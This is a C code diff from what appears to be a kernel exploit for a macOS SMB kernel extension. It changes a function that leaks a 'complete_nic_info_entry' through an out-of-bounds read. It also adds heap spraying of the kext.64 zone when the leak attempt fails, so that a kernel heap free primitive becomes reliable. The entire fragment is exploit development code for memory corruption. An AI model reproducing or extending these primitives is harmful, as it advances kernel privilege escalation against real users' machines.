@@ -89,7 +89,7 @@ int xe_kheap_free_leak_nic(smb_nic_allocator allocator, const struct sockaddr_in
     
     struct complete_nic_info_entry* entry = alloca(96);
     /// Read the `struct complete_nic_info_entry` from the fragment kext.96 zone
-    error = oob_reader_ovf_read(addr, 96, (char*)entry, 96);
+    error = xe_oob_reader_ovf_read(addr, 96, (char*)entry, 96);
     if (error) {
         return error;
     }
@@ -153,6 +153,8 @@ xe_kheap_free_session_t xe_kheap_free_session_create(const struct sockaddr_in* s
 
 struct complete_nic_info_entry xe_kheap_free_session_prepare(xe_kheap_free_session_t session) {
     xe_assert(session->state == STATE_CREATED);
+    /// kext.64 zone allocator
+    xe_allocator_nrnw_t nrnw_allocator = xe_allocator_nrnw_create(&session->smb_addr);
     /// Leak a `struct complete_nic_info_entry`
     smb_nic_allocator nic_allocator;
     struct complete_nic_info_entry entry;
@@ -161,6 +163,7 @@ struct complete_nic_info_entry xe_kheap_free_session_prepare(xe_kheap_free_sessi
         nic_allocator = smb_nic_allocator_create(&session->smb_addr, sizeof(session->smb_addr));
         int error = xe_kheap_free_leak_nic(nic_allocator, &session->smb_addr, &entry);
         if (error) {
+            xe_allocator_nrnw_allocate(nrnw_allocator, 64, XE_PAGE_SIZE / 64 * 32);
             smb_nic_allocator_destroy(&nic_allocator);
         } else {
             break;
@@ -170,6 +173,7 @@ struct complete_nic_info_entry xe_kheap_free_session_prepare(xe_kheap_free_sessi
     xe_assert(tries > 0);
     xe_assert(entry.next.tqe_prev != 0);
     
+    xe_allocator_nrnw_destroy(&nrnw_allocator);
     session->nic_allocator = nic_allocator;
     session->state = STATE_PREPARED;
     return entry;
